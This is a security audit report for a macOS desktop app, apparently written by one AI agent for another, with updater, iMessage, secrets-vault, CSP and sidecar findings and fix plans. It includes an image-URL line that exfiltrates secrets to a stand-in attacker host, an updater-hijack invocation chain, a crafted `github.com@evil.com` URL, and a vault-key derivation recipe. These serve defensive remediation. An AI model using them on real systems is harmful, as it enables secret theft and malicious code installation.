# Security Scan Round 3 For Codex

Checked: September 26, 2026, by Claude (read-only review, no code changed).
Audited commit: **`macos/main` @ `b7a82262a`** ("agentic: record claude review
verdict for 3a748b92"). All line numbers are pinned to that SHA — if they have
drifted, locate by the symbol names given.

This round is additive to `docs/SECURITY_SCAN_FINDINGS_FOR_CLAUDE.md` and
`docs/SECURITY_SCAN_ROUND_2_FOR_CLAUDE.md`. It focuses on trust boundaries the
per-PR review loop tends not to see: what a compromised renderer can reach
through privileged IPC, how secrets rest on disk, and fail-open paths in
safety-critical weather logic.

**Status legend:** 🔴 Open · 🟡 In Progress · ✅ Fixed · 🟢 Accepted (mitigated).

| ID | Severity | Title | PR | Status |
|----|----------|-------|----|--------|
| R3-SEC-001 | High | Updater installs whatever URL + hash the renderer supplies | PR 1 — [validation](validation/R3-SEC-001-UPDATER.md) | ✅ |
| R3-SEC-002 | High | `send_imessage` sends to any renderer-chosen recipient, ignores the enabled flag | PR 2 | 🔴 |
| R3-SEC-003 | High | Shadow secrets vault key is derivable by any local process | PR 4a / 4b | 🔴 |
| R3-SEC-004 | Medium | CSP still allows `'unsafe-eval'`; `img-src https:` is an exfil channel | PR 5 | 🔴 |
| R3-SEC-005 | Medium | Release build silently falls back to an unpinned system `node` for the secret-bearing sidecar | PR 7 | 🔴 |
| R3-BUG-001 | Medium | Sync Tauri commands block the macOS main thread (up to ~271 s) | PR 3 | 🔴 |
| R3-BUG-002 | Medium | Datacenter weather posture freezes when NWS `/points` fails | PR 6 | 🔴 |
| R3-SEC-006 | Low | SMS webhook fails open without `TWILIO_AUTH_TOKEN`; config patch unvalidated | PR 8 | 🔴 |
| R3-SEC-007 | Low | `/api/feed-discovery` first hop not IP-pinned (DNS-rebinding TOCTOU) | PR 8 | 🔴 |
| R3-SEC-008 | Low | `allow-unsigned-executable-memory` entitlement is broader than needed | PR 9 | 🔴 |
| R3-SEC-009 | Low | Numeric feed fields interpolated raw into HTML without runtime coercion | PR 9 | 🔴 |

Prior-scan status observed at `b7a82262a` (for reconciling the older docs):

- SEC-001 (renderer reads every secret key-by-key via `get_secret`, `main.rs:1030`): 🔴 still open. R3-SEC-004 is what makes it exploitable.
- SEC-002 / SEC-003 (`'unsafe-eval'` in desktop + web CSP): 🔴 still open → tracked here as R3-SEC-004.
- SEC-006 (sidecar token file): 🟢 still written, now `0600` with pre-write chmod (`main.rs:3811-3833`). Acceptable residual.
- R2-SEC-001/002 (cargo audit/deny, Semgrep): ✅ confirmed in `security-audit.yml` / `sast.yml`.
- R2-SEC-009 (DMG mounted before verification): ✅ confirmed; SHA-256 is checked before write/mount. R3-SEC-001 is a *different* gap: the hash itself is untrusted.

---

## Copy/Paste Prompt For Codex

```text
Read AGENTS.md, the KEYCHAIN section of CLAUDE.md, and
docs/SECURITY_SCAN_ROUND_3_FOR_CODEX.md in full before touching code.

Work the Round 3 findings one PR at a time in the order given by the
"PR Plan" section. Every R3 item except PR 0 is High Assurance under
AGENTS.md: do discovery + a written design, then STOP and wait for
Bradley's approval before production edits. Follow
.agents/skills/crystal-ball-feature-workflow/SKILL.md.

For each PR:
- Branch from "$REMOTE/main" as codex/sec-r3-<id> (see AGENTS.md
  Branch Discipline). Never develop in ~/.crystalball-main-sync.
- Satisfy that finding's "Acceptance criteria" and "Tests" sections.
- Ship a mutation proof for every behavior change (AGENTS.md
  "Mutation proof"), with real before/after pass/fail counts.
- Update this doc's status table in the same PR.
- Get the Claude cross-agent review and record the SHA-pinned verdict.
- End with the AGENTS.md completion report.

Hard stop rules:
- Never run `security`, keyring `Entry` calls, `npm run backup-keys`,
  `npm run restore-keys`, or create/import certificates. Any keychain or
  certificate step is Bradley's to perform; write instructions for him.
- Never weaken an existing test, CSP check, or secret scan to get green.
- If a finding survives two review/repair cycles, stop and escalate.
```

---

## Ground Rules Specific To This Round

1. **Threat model.** The main risk is "script executes in a trusted window".
   It can come from any of the ~271 `.innerHTML =` sinks rendering feed text,
   a compromised dependency in the renderer bundle, or a future bug. Assume it
   will happen once. The goal of this round is that it **cannot escalate**
   to code execution on the Mac, iMessages from Bradley's Apple ID, or bulk
   secret theft. The second threat is **same-user local code** (a malicious
   npm postinstall, an IDE extension, a rogue agent tool) on a dev machine.
2. **Keychain prohibition (CLAUDE.md).** Tests must never touch the real
   Keychain. Put Keychain access behind a seam (trait / injected fn) and test
   the pure logic.
3. **Fail closed** (AGENTS.md "Safety"). When a verification step cannot run,
   refuse the privileged action instead of falling back to a weaker path.
4. **Tauri 2 fact that several fixes rely on.** A `#[tauri::command]` that is
   *not* `async` runs on the **main thread**. Blocking work in one freezes
   the whole app. Use `async fn` plus `tauri::async_runtime::spawn_blocking`.

---

## Findings

### R3-SEC-001: Updater Installs Whatever URL + Hash The Renderer Supplies

Severity: **High**. Classification: High Assurance (release/install logic, IPC).

Location (`b7a82262a`):

- `src-tauri/src/main.rs`: `validate_update_url` (1782-1791),
  `installed_signer_requirement` (1871-1893),
  `verify_bundle_satisfies_requirement` (1899-1912), `stage_update` (2108+),
  `apply_staged_update` (2427+)
- `src/app/desktop-updater.ts:112, 138, 174-181, 266`
- `.github/workflows/build-desktop.yml:210` (CI falls back to ad-hoc `APPLE_SIGNING_IDENTITY=-`)
- `scripts/desktop-package.mjs:252-300` (local builds signed with self-signed "Crystal Ball Dev", ad-hoc fallback)

Evidence:

- `stage_update(download_url, expected_sha256)` takes **both** values from
  the renderer. The SHA-256 check proves the bytes match what the caller
  claimed. It does not prove the release is authentic.
- `validate_update_url` checks only that the host is one of `github.com`,
  `objects.githubusercontent.com`, or `codeload.github.com`. It does not
  check the scheme or the owner/repo/path, so any GitHub user's release asset
  passes. `reqwest`'s default redirect policy follows up to 10 redirects to
  any host.
- `installed_signer_requirement` returns `Ok(None)` for every install that is
  not `anchor apple generic`. That covers both CI ad-hoc builds and Bradley's
  local "Crystal Ball Dev" self-signed builds. `verify_bundle_satisfies_requirement(None)`
  then returns `Ok(())`, so only codesign integrity and `CFBundleIdentifier`
  are checked, and an attacker can satisfy both.
- `apply_staged_update` can also be invoked from the renderer.

Attack chain: script in the `main` window →
`invoke('stage_update', { downloadUrl: <attacker's GitHub release asset>, expectedSha256: <its hash> })`
→ `invoke('apply_staged_update')`. The attacker's bundle replaces
`~/Applications/Crystal Ball.app` and runs at every launch. A compromised
GitHub account publishing a release plus a matching hash asset gets the same
result on every non-Apple-signed install.

Context for the design: Bradley's real install path is the local main-sync
agent (self-signed local build). CI releases are ad-hoc or Developer ID, so a
GitHub release can never legitimately satisfy a pin to his local self-signed
identity. The in-app auto-install path is therefore mostly attack surface on
his machine today.

Design options (bring a recommendation; Bradley approves):

1. **Minimum fix (required regardless):**
   - The renderer no longer supplies a URL or hash. Replace the command with
     an argument-less `stage_latest_update()`: Rust fetches
     `https://api.github.com/repos/bradleybond512/crystal-ball/releases/latest`,
     selects the DMG asset, and resolves the hash itself. Keep
     `desktop-updater.ts` for UI state only.
   - Pin the URL: `https` scheme only; the exact asset hosts; path prefix
     `/bradleybond512/crystal-ball/releases/download/`.
   - Use a custom `reqwest` redirect policy that follows only to `https` +
     allowlisted asset hosts. **Probe the live redirect chain during
     discovery** (GitHub has moved asset hosting before, e.g.
     `release-assets.githubusercontent.com`). Do not guess the host list.
   - If the running install is not Apple-anchored and has no certificate-based
     designated requirement (ad-hoc), refuse in-app install and route to the
     existing `offerBrowserDownload` path (fail closed).
2. **Signer pin generalization:** for non-Apple installs whose designated
   requirement is certificate-based (the stable self-signed identity), pin to
   the installed app's own designated requirement (`codesign -d -r-`) instead
   of skipping the pin.
3. **Authenticity (recommended, cutting-edge):** sign the release manifest
   with ed25519 (minisign), with the public key compiled into the binary and
   the private key held only in a GitHub Actions secret. Evaluate
   `tauri-plugin-updater` (it already does minisign verification) against
   extending the custom path, and justify any dependency per AGENTS.md.

Acceptance criteria:

- No IPC command accepts an update URL or hash from the renderer.
- `validate_update_url` rejects all of the following: another owner/repo,
  `http:`, userinfo (`https://github.com@evil.com/...`), a non-default port,
  `..` or percent-encoded traversal in the path, and a non-allowlisted
  redirect hop.
- Ad-hoc installs cannot auto-install. They get the browser-download path.
- The existing guarantees still hold: hash before mount, symlink rejection,
  post-swap re-verification, and a single cross-process lock.

Tests:

- Rust unit tests for the URL/redirect validator covering every rejection above.
- Rust unit test for the "no signer pin available → refuse" branch.
- Extend `tests/desktop-updater-signature.test.mjs` (source-text style) to
  assert `stage_update` no longer takes `download_url` / `expected_sha256`.
- Mutation: drop the owner/path pin, and the "other owner" test must go red.

### R3-SEC-002: `send_imessage` Sends To Any Renderer-Chosen Recipient

Severity: **High**. Classification: High Assurance (IPC, outbound messaging).

Location:

- `src-tauri/src/main.rs`: `send_imessage` (~1606-1675)
- `src/services/imessage-bridge.ts:11-63` (settings in localStorage key `crystalball-imessage-settings`)
- `src/components/UnifiedSettings.ts:373, 526, 922-936`

Evidence: the recipient **and** the `enabled` flag live only in renderer
localStorage. Rust accepts any recipient of 64 bytes or fewer and never checks
whether the feature is enabled. The AppleScript quoting/sanitization is sound;
this is an **authorization** gap, not an injection.

Impact: script in the renderer can send an iMessage from Bradley's Apple ID
to any address every 30 s, even with the feature switched off. That makes his
Apple ID a phishing channel to his contacts.

Fix:

- Rust owns the iMessage config: `{ enabled, recipient }` in a `0600` JSON
  file under `app_config_dir`. **Not the Keychain** (see the prohibition).
- `send_imessage(body)` takes **no recipient**. Rust reads the config and
  refuses when the feature is disabled or unconfigured.
- Changing the recipient or enabling the feature requires a **native
  confirmation outside the webview**, for example `osascript -e 'display dialog …'`
  spawned from Rust showing the exact recipient. A renderer cannot click a
  native dialog, so this holds regardless of which window hosts the
  UnifiedSettings overlay. Check during discovery whether that overlay renders
  in `main` or `settings`. If it is only ever in `settings`, a window-label
  gate is an acceptable alternative.
- Validate the recipient: E.164 phone or RFC-5322-ish email. Reject contact
  names; they are ambiguous in Messages.
- Migrate once: if localStorage holds a recipient and the Rust config is
  empty, prompt through the same native confirmation.

Acceptance criteria: with the renderer fully controlled, no iMessage can be
sent to a recipient Bradley did not confirm natively, and none can be sent
while the feature is disabled.

Tests: Rust unit tests for config load/validate and the disabled refusal, a
source assertion that `send_imessage`'s signature has no `recipient`, and a
mutation proof that removing the enabled check turns a test red.

### R3-SEC-003: Shadow Secrets Vault Is Decryptable (And Forgeable) By Any Local Process

Severity: **High** (re-evaluation of a documented "accepted limit").
Classification: High Assurance (secrets). **Two phases; Phase B needs
Bradley's explicit go-ahead** (see the 2026-05-08 key-loss incident in CLAUDE.md).

Location:

- `src-tauri/src/main.rs`:
  - `VAULT_SHADOW_FILE` (226)
  - envelope and crypto (738-803)
  - `vault_shadow_key` (757-774)
  - `write_vault_shadow` (805-863), called from 340, 375, 442, 1103, 1164
  - `read_vault_shadow` (865-881)
  - Keychain-error fallback (386-398)
- `scripts/desktop-package.mjs:252-300` (stable identity with ad-hoc fallback)

Evidence:

- The key is `SHA-256("crystalball-vault-shadow-key-v2\0" || IOPlatformUUID)`.
- `IOPlatformUUID` is readable by any unprivileged process
  (`ioreg -rd1 -c IOPlatformExpertDevice`).
- The file sits in the app data dir with mode `0600`, which does not stop
  same-user code.
- The fallback fires on **any** Keychain `Err`: a timeout *or a dismissed/denied
  prompt*.

Impact:

1. Any same-user process can decrypt every stored API secret (up to 77 keys)
   without the Keychain ACL prompt. That prompt is the control that normally
   stops exactly this attacker.
2. **Forgery.** Anyone who can derive the key can write a valid AES-GCM
   envelope. `SUPPORTED_SECRET_KEYS` includes endpoint values
   (`OLLAMA_API_URL`, `WS_RELAY_URL`, `VITE_WS_RELAY_URL`,
   `VITE_OPENSKY_RELAY_URL`). A planted shadow vault can therefore redirect
   sidecar traffic, and it gets loaded whenever the Keychain read errors.
3. A user's "Deny" on the Keychain prompt is effectively turned into "allow".

The root cause is already half-solved. `desktop-package.mjs` signs local
builds with a stable "Crystal Ball Dev" identity, so Keychain ACLs survive
rebuilds and the shadow's reason to exist largely disappears. But it
**falls back to ad-hoc on failure** (fail open), which brings back the
per-rebuild prompts.

Phase A (PR 4a), safe and reversible:

- The main-sync / install path fails closed when stable signing fails. For
  example, add `--require-stable-identity`, used by `sync-main-to-mac.mjs`:
  ad-hoc builds may still be produced for ad-hoc experiments but are never
  installed by main-sync. This matches AGENTS.md "stop the sync instead of
  falling back to a weaker path".
- Diagnostics: log and surface in System Diagnostic (a) whether the running
  app is stable-signed (designated requirement is certificate-based) and
  (b) a counter of shadow-fallback activations.
- Write Bradley a short manual (not a script) for confirming or creating the
  "Crystal Ball Dev" identity in Keychain Access. **Codex does not perform it.**

Phase B (PR 4b), only after Phase A has soaked **and** Bradley has run
`npm run backup-keys` himself:

- Remove `read_vault_shadow` and every `write_vault_shadow` call.
- On the first successful Keychain vault read, overwrite then unlink any
  existing shadow file (best effort; APFS copy-on-write means overwrite is not
  guaranteed erasure, and FileVault covers at-rest).
- On Keychain timeout, secrets stay missing and the existing `keyMissing` /
  503 UX applies, plus a clear "Keychain didn't answer — Retry" action wired to
  the existing `reload_secrets_from_keychain`.
- Do not alter or delete any Keychain item.

Tests: source assertions that no code path reads the shadow file after a
Keychain `Err`; a test for the `--require-stable-identity` fail-closed
behavior in `desktop-package.mjs`; and a mutation proof that reinstating the
fallback goes red.

### R3-SEC-004: CSP Still Allows `'unsafe-eval'`; `img-src https:` Is An Exfil Channel

Severity: **Medium**. Classification: High Assurance (CSP).

Location:

- `src-tauri/tauri.conf.json` → `app.security.csp`: `script-src 'self' 'unsafe-eval' 'wasm-unsafe-eval'`, `img-src 'self' data: blob: https:`, `media-src … https:`, `font-src … https:`
- `index.html:7` meta CSP, which also has `'unsafe-eval'`
- `tests/csp-allowlist.test.mjs` guards `connect-src` only (line 27: "no scheme-only wildcard (the exfiltration hole)")

Impact: `'unsafe-eval'` turns any string-to-code path into execution.
`img-src https:` is the same exfiltration hole the connect-src test already
forbids: `new Image().src = 'https://attacker/?k=' + secret`. Together with
SEC-001 (`get_secret`), this is how a renderer compromise leaks keys.

Discovery hint: in Bradley's stale local `dist/` (Aug 25 build), the only
chunk containing `new Function(` was `ml.worker-*.js`. Dedicated workers take
CSP from their own response, so the main document may not need
`'unsafe-eval'` at all. **Verify on a fresh build**: grep every main-thread
chunk for `eval(`, `new Function(`, and string `setTimeout`/`setInterval`, and
check deck.gl/luma.gl, Cesium, and protobufjs code paths.

Fix:

- Remove `'unsafe-eval'` from `script-src` in both policies. Keep `'wasm-unsafe-eval'`.
- Replace `img-src https:` (and `media-src` / `font-src` where feasible) with
  an explicit host list derived from the map/tile/imagery layer configs.
  Enumerate them in discovery, including any user-configurable basemaps.
- Add a `securitypolicyviolation` listener that forwards to `log_frontend`, so
  CSP breakage is visible in the desktop log instead of silent.
- Verify with the Playwright suite (`e2e/`) plus a manual smoke of the map,
  God's Eye, ML worker, and YouTube live channels.

Tests: extend `tests/csp-allowlist.test.mjs` to assert that neither policy
contains `'unsafe-eval'` in `script-src` and that `img-src` has no
scheme-only `https:`. Mutation: add either back, and a test must go red.

### R3-SEC-005: Release Build Silently Falls Back To An Unpinned System `node`

Severity: **Medium**. Classification: High Assurance (secrets, process spawn).

Location: `src-tauri/src/main.rs` `resolve_node_binary` (3599-3660), used at
3749; secrets are injected into the child env around 3870-3890.

Evidence: in release builds, if `<resources>/sidecar/node/node` is missing,
the resolver falls back to `PATH` entries, then `/opt/homebrew/bin/node`,
`/usr/local/bin/node`, and so on. That child process receives
`LOCAL_API_TOKEN` and every Keychain secret. Homebrew's `node` is
user-writable and changes on every `brew upgrade`, and `PATH` may contain
relative entries.

Fix: under `#[cfg(not(debug_assertions))]`, use the bundled binary only and
fail closed with a clear desktop-log message and UI error. Optionally verify
the bundled binary's SHA-256 against a value embedded at build time.
`scripts/download-node.sh` already verifies SHASUMS256, so thread that hash
through `build.rs`. Debug builds keep the fallback.

Tests: Rust unit test with a temp "resource dir" (release-mode logic factored
into a pure fn) asserting there is no PATH fallback. Include a mutation proof.

### R3-BUG-001: Sync Tauri Commands Block The macOS Main Thread

Severity: **Medium** (reliability; the watchdog cannot recover it).
Classification: High Assurance (secrets path).

Location (`src-tauri/src/main.rs`):

- `set_secret` (1077), `delete_secret` (1149)
- `wait_until_secrets_loaded` (~1047-1075)
- `save_vault` (727-736)
- `send_imessage` (`Command::status()` waits for osascript/Messages, including
  the first-run Automation TCC prompt)
- Watchdog loop in `.setup` (~4655-4700)

Evidence:

- Both commands are non-`async`, so they run on the main thread.
- `wait_until_secrets_loaded` sleep-polls every 50 ms for up to
  `KEYCHAIN_VAULT_TIMEOUT (10s) + KEYCHAIN_PER_CALL_TIMEOUT (3s) × 77 + 30s ≈ 271 s`.
- `save_vault` (`set_password`) has **no timeout** and runs while holding the
  `secrets` mutex.
- The renderer watchdog calls `win.is_focused()`, which needs the main thread,
  so it stalls too and cannot detect or recover the hang.

Fix:

- Make `set_secret`, `delete_secret`, and `send_imessage` `async` and move the
  blocking work to `spawn_blocking`.
- Replace the sleep-poll with a `Condvar` or `tokio::sync::Notify` signalled
  when loading completes.
- Do not hold the `secrets` lock across the Keychain write. Serialize writers
  with a dedicated write mutex, build `proposed` from a snapshot, write, then
  swap. Add a test that two concurrent `set_secret` calls do not lose an
  update.
- Bound the Keychain write with the same timeout pattern as
  `read_keychain_entry_with_timeout`.
- Watchdog: track focus through a window-event listener into an `AtomicBool`
  instead of calling `is_focused()` from the background thread.
- Audit every remaining sync command that does I/O (`write_cache_entry` /
  `delete_cache_entry` → `flush`, `save_brief` with up to 64 MB) and convert
  where warranted.

Tests: source assertion that these commands are `async`, and a lost-update
test using an injected fake vault writer (never the real Keychain). Include a
mutation proof.

### R3-BUG-002: Datacenter Weather Posture Freezes When NWS `/points` Fails

Severity: **Medium** (safety-relevant, correlated failure).
Classification: High Assurance (weather warning path).

Location:

- `src/app/data-loader.ts`: zone lookup at 1861-1875 inside the posture
  `try` (1853-1943); outer `catch` at 1944 logs "skipping this tick"
- `src/services/weather.ts` `fetchNwsPointJurisdiction` (544-581): throws on
  any non-404 failure

Evidence: the code comment promises "best-effort — degrades to polygon-only
matching on failure". Actually, a 5xx, 429, 8 s timeout, or malformed body
from `/points` throws out of the zone lookup into the outer `catch`, so
`recomputeDatacenterPosture` is **skipped** and the previous posture (possibly
all-clear) stays on screen. `api.weather.gov` degrades most during severe
weather outbreaks, which is exactly when this matters. The window lasts until
the site's zones resolve once (first run, a changed site, or a site that has
never resolved).

Fix:

- Give the zone lookup its own `try/catch`. On failure, proceed with
  polygon-only matching and pass a `zoneCoverage: 'degraded'` (or similar)
  flag into the posture, so the UI says zone-based alerts are unverified
  instead of showing clear.
- Do not cache failures. Keep caching the 404 `outside-jurisdiction` result.
- While there, confirm the posture UI shows staleness when a recompute is
  skipped for any other reason.

Tests: extract a pure helper (for example `resolveSiteZonesBestEffort`) with
unit tests (thrown fetch → `{ zones: [], degraded: true }` and the posture
still computes), plus a source-scoped wiring assertion in the style of
`tests/data-sources-wiring.test.mjs`. Mutation: remove the inner `catch`, and
a test must go red.

### R3-SEC-006: SMS Webhook Fails Open; Config Patch Unvalidated

Severity: **Low** (loopback-only today; becomes real if a tunnel is ever added).

Location: `src-tauri/sidecar/local-api-server.mjs` 7496-7560
(`/api/sms/command`, pre-auth) and 7583-7594 (`/api/sms/config` POST:
`{ ..._smsConfig, ...patch }`).

Evidence: without `TWILIO_AUTH_TOKEN`, a request with no `Origin` header and
a `From` field matching the allowlist is accepted. The `From` value is
entirely caller-controlled. Commands are read-only (STATUS/BRIEF/SITREP/WATCH/ALERT),
but SITREP can reveal personal context.

Fix:

- When SMS is enabled and no Twilio token is configured, reject non-token
  callers with 503 "Twilio signature required". The bearer-token test path
  keeps working.
- Validate the config patch against an allowlisted schema: `enabled: boolean`;
  `allowlist: [{ phone: E.164, tier: enum }]` with a size cap. Reject unknown keys.

Tests: add to `local-api-server.test.mjs` / `sms-security.test.mjs`, with a
mutation proof.

### R3-SEC-007: `/api/feed-discovery` First Hop Not IP-Pinned

Severity: **Low** (authenticated caller required).

Location: `local-api-server.mjs` 15656-15725 (`fetchWithTimeout(target.href, { redirect: 'follow' })`
and the HEAD probes at ~15715).

Evidence: `isSafeUrl` validates, but the first fetch re-resolves DNS
unpinned, unlike `/api/rss-proxy` (~15730-15780), which pins `pinnedV4`.
Redirect hops are already re-validated by the global `ipv4Fetch` wrapper
(1490-1535), so only hop 0 is exposed.

Fix: reuse the rss-proxy pinning mechanism for the homepage fetch and the
probes. Test: a rebinding-style unit test with a stubbed resolver, if the
existing SSRF tests allow it.

### R3-SEC-008: `allow-unsigned-executable-memory` Is Broader Than Needed

Severity: **Low**.

Location: `src-tauri/Entitlements.plist` grants both
`com.apple.security.cs.allow-jit` and `…allow-unsigned-executable-memory`.

Fix: remove `allow-unsigned-executable-memory`. V8 on Apple Silicon uses
`MAP_JIT`, which `allow-jit` covers, and WKWebView JIT runs in Apple's
WebContent process. **Discovery:** confirm how `desktop-package.mjs` signs the
bundled `node` (deep-signed with these entitlements?) and smoke-test the
sidecar, ML worker, and map. Test: a plist assertion.

### R3-SEC-009: Numeric Feed Fields Interpolated Raw Into HTML

Severity: **Low** (defense in depth; TypeScript types are not runtime validation).

Examples: `src/components/MapPopup.ts` ~1050 (`${event.changePct}`),
~1058 (`${event.windowHours}`), ~1078 (`${event.fatalities}`), and
`src/components/CountryIntelModal.ts:274` (`${data.weekChangePercent}`,
already a string, since it is `parseFloat`ed elsewhere).

Fix: coerce with `Number()` plus a finite check **at the provider boundary**
(AGENTS.md: "Validate and normalize external data at provider boundaries").
Optionally add a lint rule or test that flags `${…}` inside HTML template
literals unless it is wrapped in `escapeHtml` / `Number` / an approved
formatter. This is the scalable version of SEC-007 from round 1.

---

## PR Plan

| PR | Scope | Depends on | Suggested effort |
|----|-------|-----------|------------------|
| 0 | Land this doc; add a pointer line in CLAUDE.md "Security scan" list (Fast, docs-only) | — | low |
| 1 | R3-SEC-001 updater | — | **high** (design gate) |
| 2 | R3-SEC-002 iMessage | — | medium |
| 3 | R3-BUG-001 main-thread blocking | — | medium |
| 4a | R3-SEC-003 Phase A (fail-closed signing + diagnostics) | — | medium |
| 4b | R3-SEC-003 Phase B (retire shadow vault) | 4a soaked + Bradley's approval + his `backup-keys` run | **high** |
| 5 | R3-SEC-004 CSP | ideally after 1-2 | medium-high (breakage risk) |
| 6 | R3-BUG-002 datacenter posture | — (independent; can run in parallel) | low-medium |
| 7 | R3-SEC-005 node pinning | — | low-medium |
| 8 | R3-SEC-006 + R3-SEC-007 (sidecar lows) | — | low |
| 9 | R3-SEC-008 + R3-SEC-009 | — | low |

Token discipline: spend high reasoning effort only on the design gates for
PR 1 and PR 4b. The rest are mechanical once the design is approved.

---

## Already Verified — Do Not Re-Audit

These were checked in this round and held up. Spend effort elsewhere.

- All 36 IPC commands call `require_trusted_window` (checked with a script over
  `main.rs`); `get_native_location` gates on `is_main_window`.
- Sidecar Host-header allowlist (DNS-rebinding defense, `local-api-server.mjs:490-495`)
  and timing-safe bearer compare (474-481).
- `isPrivateIP` / `isSafeUrl`, including IPv6-wrapped IPv4, NAT64/6to4, and
  `0.0.0.0/8` (1696-1860); global `ipv4Fetch` redirect re-validation and
  pinning (1490-1535).
- `api/rss-proxy.js`: domain allowlist, https-only, manual redirect validation (SEC-005 is fixed).
- `open_url`: https-only plus private/loopback host block. `fetch_polymarket`: fixed host.
- AppleScript quoting in `send_notification` / `send_imessage` (strips `"`, `\`, control chars).
- Escape-before-markdown in `CountryBriefPage`, `CountryIntelModal`, and
  `IntelligenceBriefingPanel`; DOMPurify allowlist in `src/utils/safe-html.ts`.
- Updater: hash before write/mount, symlink rejection, per-request staging
  dir, cross-process lock, post-swap re-verification plus exact-version check.
- NWS polygon matcher: ring handling, MultiPolygon union, UGC zone fallback
  wiring for saved places.
- Review-verdict verifier runs from `origin/main` (a PR cannot weaken its own
  gate). The documented limit that reviewer identity is self-attested without
  CI-side execution still stands.

Not exhaustively audited: the 271 `.innerHTML =` sinks (a heuristic scan's
sampled hits were all escaped) and the 22k-line sidecar beyond the routes
listed above.

---

## Definition Of Done

- No IPC command accepts a renderer-supplied update URL, update hash, or iMessage recipient.
- Ad-hoc installs cannot self-update in-app; non-Apple stable installs pin their own designated requirement.
- The shadow vault is gone (Phase B), and main-sync never installs an ad-hoc build.
- Neither CSP contains `'unsafe-eval'` in `script-src`; `img-src` has no scheme-only `https:`; CSP violations reach the desktop log.
- Release builds refuse to start the sidecar without the bundled, hash-verified `node`.
- No blocking work (Keychain, osascript, large disk writes) runs in a sync command.
- Datacenter posture recomputes, marked degraded, when NWS `/points` fails.
- Every behavior change has a recorded mutation proof; `npm run typecheck:all`,
  `npm run test:sidecar`, `cargo test` (in `src-tauri`), `npm run secrets:scan`,
  and `bash scripts/agentic-validate.sh --tests "<scripts run>"` pass, quoted
  as real output.
- This doc's status table is updated in each PR.
